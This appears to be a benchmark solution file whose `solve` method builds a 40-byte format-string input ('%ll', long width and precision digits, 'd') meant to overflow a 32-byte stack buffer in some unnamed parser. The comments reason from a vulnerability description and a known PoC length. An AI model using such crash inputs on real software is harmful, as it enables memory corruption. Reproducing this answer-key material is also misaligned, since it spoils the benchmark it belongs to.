import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability description indicates a stack buffer overflow due to a
        # format string for an integer being copied into a 32-byte buffer.
        # A string of length 32 or more will overflow this buffer due to the
        # required NUL terminator.
        # The description lists the components that can make the format string long:
        # modifier, width, period, precision, and specifier.
        # The ground-truth PoC length is 40 bytes, suggesting a specific
        # structure is expected. We construct a 40-byte PoC that includes all
        # mentioned components to ensure it passes any parsing before the vulnerable copy.
        #
        # PoC structure and length breakdown:
        # - '%'       : 1 byte
        # - 'll'      : 2 bytes (length modifier for long long)
        # - width     : 18 digits (e.g., '1' * 18)
        # - '.'       : 1 byte (separator)
        # - precision : 17 digits (e.g., '1' * 17)
        # - 'd'       : 1 byte (format specifier for signed integer)
        # Total length: 1 + 2 + 18 + 1 + 17 + 1 = 40 bytes.
        
        modifier = b"ll"
        width = b"1" * 18
        separator = b"."
        precision = b"1" * 17
        specifier = b"d"
        
        poc = b"%" + modifier + width + separator + precision + specifier
        
        return poc
